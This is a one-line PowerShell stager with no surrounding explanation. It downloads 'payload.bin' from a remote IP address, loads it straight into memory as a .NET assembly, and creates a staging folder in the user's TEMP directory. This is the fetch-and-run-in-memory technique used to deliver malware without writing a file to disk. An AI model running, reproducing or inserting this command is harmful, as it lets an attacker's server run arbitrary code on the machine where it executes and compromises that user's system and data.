
$StageBytes = (New-Object System.Net.WebClient).DownloadData('http://198.51.100.122:8080/payload.bin'); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
